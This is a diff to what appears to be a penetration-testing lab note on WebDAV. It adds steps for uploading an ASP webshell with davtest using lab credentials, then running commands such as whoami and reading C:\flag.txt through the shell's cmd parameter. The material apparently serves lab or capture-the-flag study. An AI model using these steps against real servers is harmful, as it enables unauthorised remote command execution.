@@ -1,7 +1,7 @@
 
 What WebDAV looks like from scan
 ```bash
-nmap -p80 --script http-enum -sV #IP
+nmap -p80 --script http-enum -sV $IP
 ```
 
 ```bash
@@ -55,6 +55,19 @@ Executes: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.html
 
 Then will provide screenshot of what files were successfully uploaded as well as which files were successfully executed.
 
+Uploading files with davtest. Use one of the executable file types from above test and a location that worked.
+```bash
+davtest -auth bob:password_123321 -url http://$IP/webdav -uploadfile /usr/share/webshells/asp/webshell.asp -uploadloc /DavTestDir_i9JStP/
+```
+
+Then run commands like this:
+```bash
+http://10.0.16.177/webdav/webshell.asp?cmd=whoami
+```
+
+```bash
+URL: http://$IP$webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
+```
 ## cadaver
 ```bash
 cadaver http://$IP/webdav
